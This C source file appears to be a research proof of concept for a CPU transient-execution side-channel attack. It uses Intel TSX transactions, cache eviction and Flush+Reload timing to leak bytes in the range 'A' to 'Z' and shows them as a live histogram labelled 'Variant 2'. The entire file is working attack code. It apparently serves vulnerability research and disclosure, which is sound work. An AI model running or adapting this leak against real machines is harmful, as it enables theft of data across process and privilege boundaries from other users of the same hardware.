#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <linux/mman.h>

#include "cacheutils_tsx.h"

#define FROM 'A'
#define TO 'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];
uint64_t counter = 0;

void recover(void);

int main(int argc, char *argv[])
{
  if (!has_tsx())
  {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }

  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));
  char *mem_evict = (char *)mmap(0, 320 * 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  for (size_t i = 0; i < 256; i++)
  {
    flush(mem + i * 4096);
  }

  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);

  while (true)
  {
    counter++;
    /* Flush mapping */
    flush(mapping);

    for (int i = 0; i < 4; i++)
    {
      for (uint64_t j = 0; j < 11; j += 1)
      {
        maccess(&mem_evict);
      }
    }

    /* Begin transaction and recover value */
    if (xbegin() == (~0u))
    {
      maccess(mem + 4096 * mapping[0]);
      xend();
    }

    recover();
  }

  return 0;
}

void recover(void)
{

  /* Recover value from cache and update histogram */
  bool update = false;
  uint64_t hit_sum = 0;
  for (size_t i = FROM; i <= TO; i++)
  {
    if (flush_reload((char *)mem + 4096 * i))
    {
      hist[i]++;
      update = true;
    }
  }

  /* Redraw histogram on update */
  if (update == true)
  {
#ifdef _WIN32
    system("cls");
#else
    printf("\x1b[2J");
#endif
    for (size_t i = FROM; i <= TO; i++)
    {
      hit_sum += hist[i];
    }

    int max = 1;

    for (int i = FROM; i <= TO; i++)
    {
      if (hist[i] > max)
      {
        max = hist[i];
      }
    }

    for (int i = FROM; i <= TO; i++)
    {
      printf("%c: (%4u) ", i, (unsigned int)hist[i]);
      for (int j = 0; j < hist[i] * 60 / max; j++)
      {
        printf("#");
      }
      printf("\n");
    }
    printf("%10ld %5d %.3lf\%\n", counter, hit_sum, 100.0 * (double)hit_sum / counter);

    fflush(stdout);
  }
}
